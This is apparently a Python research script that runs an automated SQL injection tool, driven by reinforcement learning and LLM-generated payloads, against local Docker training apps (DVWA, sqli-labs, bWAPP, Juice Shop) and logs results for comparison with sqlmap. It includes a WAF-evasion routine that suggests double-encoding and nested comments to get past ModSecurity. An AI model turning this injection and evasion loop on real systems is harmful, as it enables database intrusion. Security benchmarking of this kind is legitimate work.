"""SQLiRLLM live-target runner against Docker vulnerable applications.

Probes the same Docker endpoints as sqlmap_runner.py using the full
SQLiRLLM pipeline (Q-Learning + LLM payloads + LLM analysis + ethics guard),
and writes structured results to results/live/sqlirllm_results.json for
comparison.

Usage:
    python -m experiments.live.sqlirllm_runner
    python -m experiments.live.sqlirllm_runner --targets dvwa_sqli sqli_labs_1
    python -m experiments.live.sqlirllm_runner --strategies error_based time_blind
    python -m experiments.live.sqlirllm_runner --max-attempts 5 --request-timeout 20
"""
from __future__ import annotations

import argparse
import json
import re
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, List, Optional

import requests

from sqlirllm.analyzer import Analyzer
from sqlirllm.config import CONFIG, STRATEGIES
from sqlirllm.environment import WAF, evasion_score, looks_like_injection
from sqlirllm.ethics import EthicsGuard
from sqlirllm.llm_client import LLMClient
from sqlirllm.payload_generator import PayloadGenerator
from sqlirllm.qlearning import QLearningAgent, encode_state
from sqlirllm.environment import ExecutionResponse, Outcome

RESULTS = Path(__file__).resolve().parent.parent.parent / "results" / "live"

# --------------------------------------------------------------------------- #
# Live target definitions (mirror those in sqlmap_runner)                     #
# --------------------------------------------------------------------------- #
@dataclass
class LiveHTTPTarget:
    name: str
    platform: str
    method: str  # "GET" or "POST"
    url: str
    param: str               # parameter to inject into
    base_value: str
    cookie: Optional[str] = None
    content_type: str = "application/x-www-form-urlencoded"
    has_waf: bool = False
    framework: str = "php"
    database: str = "mysql"
    authorized: bool = True


LIVE_TARGETS: Dict[str, LiveHTTPTarget] = {
    "dvwa_sqli": LiveHTTPTarget(
        "dvwa_sqli", "DVWA", "GET",
        "http://localhost:8090/vulnerabilities/sqli/",
        param="id", base_value="1",
        cookie="PHPSESSID=placeholder; security=low",
        framework="php", database="mysql",
    ),
    "dvwa_sqli_medium": LiveHTTPTarget(
        "dvwa_sqli_medium", "DVWA (medium)", "POST",
        "http://localhost:8090/vulnerabilities/sqli/",
        param="id", base_value="1",
        cookie="PHPSESSID=placeholder; security=medium",
        framework="php", database="mysql",
    ),
    "dvwa_waf": LiveHTTPTarget(
        "dvwa_waf", "DVWA+ModSecurity", "GET",
        "http://localhost:8080/vulnerabilities/sqli/",
        param="id", base_value="1",
        cookie="PHPSESSID=placeholder; security=low",
        has_waf=True, framework="php", database="mysql",
    ),
    "sqli_labs_1": LiveHTTPTarget(
        "sqli_labs_1", "sqli-labs Less-1", "GET",
        "http://localhost:8094/Less-1/",
        param="id", base_value="1",
        framework="php", database="mysql",
    ),
    "sqli_labs_11": LiveHTTPTarget(
        "sqli_labs_11", "sqli-labs Less-11", "POST",
        "http://localhost:8094/Less-11/",
        param="uname", base_value="admin",
        framework="php", database="mysql",
    ),
    "bwapp_sqli": LiveHTTPTarget(
        "bwapp_sqli", "bWAPP", "GET",
        "http://localhost:8091/sqli_1.php",
        param="title", base_value="iron man",
        cookie="PHPSESSID=placeholder; security_level=0",
        framework="php", database="mysql",
    ),
    "juiceshop_login": LiveHTTPTarget(
        "juiceshop_login", "Juice Shop", "POST",
        "http://localhost:8092/rest/user/login",
        param="email", base_value="test@test.com",
        content_type="application/json",
        framework="express", database="sqlite",
    ),
}


# --------------------------------------------------------------------------- #
# HTTP probe                                                                   #
# --------------------------------------------------------------------------- #
_DB_ERROR_PATTERNS = re.compile(
    r"sql syntax|ORA-\d+|SQLITE_ERROR|unclosed quotation|syntax error in your|"
    r"mysql_fetch|pg_query|You have an error|Microsoft OLE DB|ODBC SQL Server|"
    r"supplied argument is not a valid MySQL|Warning.*mysql_.*\(\)",
    re.I,
)
_UNION_PATTERNS = re.compile(
    r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[0-9a-f]{32}|root@|"
    r"information_schema|CURRENT_USER\(\))",
    re.I,
)
_TIME_THRESHOLD_MS = 3500.0  # deliberate delay suggests time-based injection


def probe(target: LiveHTTPTarget, payload: str, timeout: float = 12.0) -> ExecutionResponse:
    """Send the payload to the live target and return an ExecutionResponse."""
    headers = {"User-Agent": "SQLiRLLM-Research/1.0 (academic evaluation)"}
    if target.cookie:
        headers["Cookie"] = target.cookie
    if target.content_type and target.method == "POST":
        headers["Content-Type"] = target.content_type

    t0 = time.perf_counter()
    try:
        if target.method == "GET":
            resp = requests.get(
                target.url, params={target.param: payload, "Submit": "Submit"},
                headers=headers, timeout=timeout, allow_redirects=True,
            )
        else:
            if "application/json" in target.content_type:
                data = {target.param: payload, "password": "x"}
                resp = requests.post(target.url, json=data, headers=headers, timeout=timeout)
            else:
                data = {target.param: payload, "Submit": "Submit", "passwd": "x"}
                resp = requests.post(target.url, data=data, headers=headers, timeout=timeout)
        latency = (time.perf_counter() - t0) * 1000.0
        body = resp.text[:2000]
        status = resp.status_code
    except requests.exceptions.Timeout:
        return ExecutionResponse(0, "", timeout * 1000, Outcome.SAFE)
    except Exception as exc:
        return ExecutionResponse(0, str(exc)[:200], 0.0, Outcome.SAFE)

    # Classify outcome for response-analysis context.
    if status in (403, 406) or "ModSecurity" in body or "blocked" in body.lower():
        outcome = Outcome.BLOCKED
    elif latency > _TIME_THRESHOLD_MS:
        outcome = Outcome.VULNERABLE
    elif _DB_ERROR_PATTERNS.search(body) or _UNION_PATTERNS.search(body):
        outcome = Outcome.VULNERABLE
    else:
        outcome = Outcome.SAFE

    return ExecutionResponse(status, body, latency, outcome)


def _infer_waf_filters(payload: str, response: ExecutionResponse, attempt: int) -> str:
    """Infer which WAF filters were likely triggered based on response and payload."""
    if response.outcome != Outcome.BLOCKED or not response.body:
        return ""
    
    body_lower = response.body.lower()
    signals = []
    
    # Detect keyword-based filters
    dangerous_keywords = [
        "union", "select", "from", "where", "and", "or", "sleep",
        "information_schema", "benchmark", "load_file", "into", "order", "group"
    ]
    for kw in dangerous_keywords:
        if kw in payload.lower():
            signals.append(f"keyword '{kw}' may have triggered filter")
    
    # Detect encoding/obfuscation detection
    if "%" in payload and "encode" in body_lower:
        signals.append("URL encoding detected by WAF")
    if "/*" in payload and ("comment" in body_lower or "syntax" in body_lower):
        signals.append("SQL comments detected as suspicious")
    if "%27" in payload or "%22" in payload:
        signals.append("Character encoding detected")
    
    # Specific CRS patterns
    if "modsecurity" in body_lower:
        if attempt == 0:
            signals.append("Use aggressive URL encoding and character substitution")
        elif attempt == 1:
            signals.append("ModSecurity active; try double-encoding and nested comments")
        else:
            signals.append("ModSecurity resisting; escalate to semantic variations and hex encoding")
    
    feedback = "; ".join(signals) if signals else "WAF blocked payload; escalate evasion techniques"
    return feedback[:256]


# --------------------------------------------------------------------------- #
# Per-target test                                                              #
# --------------------------------------------------------------------------- #
def _get_dvwa_session(level: str = "low") -> Optional[str]:
    try:
        import subprocess
        r = subprocess.run(
            ["curl", "-s", "-c", "-", "-b", "",
             "-d", "username=admin&password=password&Login=Login",
             "http://localhost:8090/login.php"],
            capture_output=True, text=True, timeout=15,
        )
        m = re.search(r"PHPSESSID\s+(\S+)", r.stdout)
        sid = m.group(1) if m else "placeholder"
        return f"PHPSESSID={sid}; security={level}"
    except Exception:
        return None


@dataclass
class LiveTestResult:
    target_name: str
    platform: str
    has_waf: bool
    strategies_tried: int
    strategies_succeeded: int
    waf_encounters: int
    waf_bypasses: int
    best_strategy: Optional[str]
    best_payload: Optional[str]
    best_evasion_score: float
    total_duration_s: float
    ethical_violations: int
    detailed: List[Dict] = field(default_factory=list)


def test_target(
    target: LiveHTTPTarget,
    agent: QLearningAgent,
    payload_gen: PayloadGenerator,
    analyzer: Analyzer,
    guard: EthicsGuard,
    strategy_subset: Optional[List[str]] = None,
    max_attempts: int = 3,
    request_timeout: float = 12.0,
) -> LiveTestResult:
    t_start = time.perf_counter()
    # Refresh DVWA session.
    if "dvwa" in target.name:
        level_str = "medium" if "medium" in target.name else "low"
        cookie = _get_dvwa_session(level_str)
        if cookie:
            target.cookie = cookie

    state = encode_state({
        "framework": target.framework,
        "database": target.database,
        "waf": "present" if target.has_waf else "absent",
        "phase": "initial",
    })
    ordered_strategies = agent.ranked_strategies(state)
    if strategy_subset:
        allowed = set(strategy_subset)
        ordered_strategies = [s for s in ordered_strategies if s in allowed]

    result = LiveTestResult(
        target_name=target.name,
        platform=target.platform,
        has_waf=target.has_waf,
        strategies_tried=0,
        strategies_succeeded=0,
        waf_encounters=0,
        waf_bypasses=0,
        best_strategy=None,
        best_payload=None,
        best_evasion_score=0.0,
        total_duration_s=0.0,
        ethical_violations=0,
    )

    context = {
        "framework": target.framework,
        "database": target.database,
        "waf": "present" if target.has_waf else "absent",
        "phase": "initial",
    }

    for strategy in ordered_strategies:
        auth = guard.authorize(target.name, strategy)
        if not auth.authorized:
            result.ethical_violations += 1
            continue

        result.strategies_tried += 1
        succeeded = False
        feedback = ""

        for attempt in range(max_attempts):
            payload = payload_gen.generate(strategy, context, attempt, feedback=feedback)
            escore = evasion_score(payload)
            response = probe(target, payload, timeout=request_timeout)

            if target.has_waf:
                result.waf_encounters += 1
                if response.outcome != Outcome.BLOCKED:
                    result.waf_bypasses += 1
                    context["phase"] = "verification"
                    feedback = "WAF bypassed on previous attempt; prioritize exploit confirmation"
                else:
                    context["phase"] = "waf_evasion"
                    # Use intelligent feedback inference
                    feedback = _infer_waf_filters(payload, response, attempt)

            analysis = analyzer.analyze(strategy, response)

            row = {
                "strategy": strategy,
                "attempt": attempt,
                "payload": payload[:120],
                "evasion_score": round(escore, 2),
                "http_status": response.status_code,
                "latency_ms": round(response.latency_ms, 0),
                "outcome": response.outcome.value,
                "llm_verdict": analysis.vulnerable,
                "severity": analysis.severity,
                "signal": analysis.signal,
            }
            result.detailed.append(row)

            if analysis.vulnerable:
                succeeded = True
                if escore > result.best_evasion_score:
                    result.best_strategy = strategy
                    result.best_payload = payload
                    result.best_evasion_score = escore
                break

        if succeeded:
            result.strategies_succeeded += 1

    result.total_duration_s = round(time.perf_counter() - t_start, 1)
    return result


# --------------------------------------------------------------------------- #
# Main                                                                         #
# --------------------------------------------------------------------------- #
def run(
    target_names: List[str],
    strategy_subset: Optional[List[str]] = None,
    max_attempts: int = 3,
    request_timeout: float = 12.0,
    seed: Optional[int] = None,
    llm_use_cache: bool = True,
    strict_llm_api: bool = False,
    verify_api_ping: bool = False,
) -> List[Dict]:
    RESULTS.mkdir(parents=True, exist_ok=True)
    cfg = CONFIG
    client = LLMClient(cfg.llm)
    if strict_llm_api and not cfg.llm.is_configured:
        raise RuntimeError(
            "strict_llm_api=True but GAPGPT_API_KEY is not configured. "
            "Set GAPGPT_API_KEY in environment or .env."
        )
    if verify_api_ping:
        ping = client.chat(
            model=cfg.llm.payload_model,
            system="Return exactly OK.",
            user="Return OK",
            temperature=0.0,
            max_tokens=8,
            use_cache=False,
        )
        if not ping:
            raise RuntimeError("LLM API verification ping failed before live run.")
        print("  [sqlirllm] API ping succeeded")
    effective_seed = cfg.seed if seed is None else seed
    agent = QLearningAgent(cfg.qlearning, seed=effective_seed)
    payload_gen = PayloadGenerator(client, cfg.llm, seed=effective_seed, use_cache=llm_use_cache)
    analyzer = Analyzer(client, cfg.llm, llm_enabled=True, use_cache=llm_use_cache)
    guard = EthicsGuard(authorized_targets={n for n in target_names})

    if strategy_subset:
        invalid = sorted(set(strategy_subset) - set(STRATEGIES))
        if invalid:
            raise ValueError(f"Unknown strategies: {invalid}. Valid: {STRATEGIES}")
        print(f"  [sqlirllm] strategy subset={strategy_subset}")
    print(
        f"  [sqlirllm] max_attempts={max_attempts} request_timeout={request_timeout}s "
        f"seed={effective_seed} llm_cache={llm_use_cache} strict_llm_api={strict_llm_api}"
    )

    rows: List[Dict] = []
    for name in target_names:
        t = LIVE_TARGETS.get(name)
        if t is None:
            print(f"  [warn] unknown target '{name}'")
            continue
        print(f"  [sqlirllm] {name}  ({t.platform}, waf={t.has_waf})")
        try:
            r = test_target(
                t,
                agent,
                payload_gen,
                analyzer,
                guard,
                strategy_subset=strategy_subset,
                max_attempts=max_attempts,
                request_timeout=request_timeout,
            )
            bypass_rate = r.waf_bypasses / r.waf_encounters if r.waf_encounters else None
            d: Dict = {
                "tool": "SQLiRLLM",
                "target": r.target_name,
                "platform": r.platform,
                "has_waf": r.has_waf,
                "strategies_tried": r.strategies_tried,
                "strategies_succeeded": r.strategies_succeeded,
                "waf_encounters": r.waf_encounters,
                "waf_bypasses": r.waf_bypasses,
                "waf_bypass_rate": round(bypass_rate, 2) if bypass_rate is not None else None,
                "best_strategy": r.best_strategy,
                "best_evasion_score": round(r.best_evasion_score, 2),
                "total_duration_s": r.total_duration_s,
                "ethical_violations": r.ethical_violations,
                "detailed": r.detailed,
            }
            rows.append(d)
            print(f"    -> succeeded={r.strategies_succeeded}/{r.strategies_tried} "
                  f"waf_bypass={bypass_rate} best={r.best_strategy} "
                  f"time={r.total_duration_s}s")
        except Exception as exc:
            print(f"    -> ERROR {exc}")
            rows.append({"tool": "SQLiRLLM", "target": name, "error": str(exc)})

    out = RESULTS / "sqlirllm_results.json"
    out.write_text(json.dumps(rows, indent=2))
    telemetry = {
        "llm_configured": cfg.llm.is_configured,
        "api_calls": client.calls,
        "cache_hits": client.cache_hits,
        "offline_payload_fallbacks": payload_gen.offline_used,
        "analyzer_llm_calls": analyzer.llm_calls,
        "analyzer_heuristic_calls": analyzer.heuristic_calls,
        "llm_cache_enabled": llm_use_cache,
        "strict_llm_api": strict_llm_api,
        "verify_api_ping": verify_api_ping,
    }
    telemetry_out = RESULTS / "sqlirllm_telemetry.json"
    telemetry_out.write_text(json.dumps(telemetry, indent=2))
    print(
        "  [sqlirllm] telemetry "
        f"api_calls={client.calls} cache_hits={client.cache_hits} "
        f"offline_fallbacks={payload_gen.offline_used} analyzer_llm={analyzer.llm_calls} "
        f"analyzer_heuristic={analyzer.heuristic_calls}"
    )
    if strict_llm_api and client.calls == 0:
        raise RuntimeError(
            "No live LLM API calls were made (api_calls=0). "
            "Disable cache with --no-llm-cache or clear results/cache and retry."
        )
    print(f"\n  SQLiRLLM live results -> {out}")
    print(f"  SQLiRLLM telemetry -> {telemetry_out}")
    return rows


def main() -> None:
    p = argparse.ArgumentParser(description="SQLiRLLM live-target runner.")
    p.add_argument("--targets", nargs="+", default=list(LIVE_TARGETS.keys()),
                   choices=list(LIVE_TARGETS.keys()), metavar="T")
    p.add_argument("--strategies", nargs="+", default=None,
                   choices=list(STRATEGIES), metavar="STRATEGY",
                   help="Restrict live tests to selected SQLi strategy families.")
    p.add_argument("--max-attempts", type=int, default=3,
                   help="Payload attempts per strategy before moving to next strategy.")
    p.add_argument("--request-timeout", type=float, default=12.0,
                   help="HTTP timeout in seconds for each live probe request.")
    p.add_argument("--seed", type=int, default=None,
                   help="Override random seed for policy/payload ordering reproducibility.")
    p.add_argument("--no-llm-cache", action="store_true",
                   help="Disable LLM response cache (forces fresh provider requests).")
    p.add_argument("--strict-llm-api", action="store_true",
                   help="Fail the run if zero live LLM provider calls are made.")
    p.add_argument("--verify-api-ping", action="store_true",
                   help="Send a tiny uncached test request before running targets.")
    args = p.parse_args()
    run(
        args.targets,
        strategy_subset=args.strategies,
        max_attempts=args.max_attempts,
        request_timeout=args.request_timeout,
        seed=args.seed,
        llm_use_cache=not args.no_llm_cache,
        strict_llm_api=args.strict_llm_api,
        verify_api_ping=args.verify_api_ping,
    )


if __name__ == "__main__":
    main()
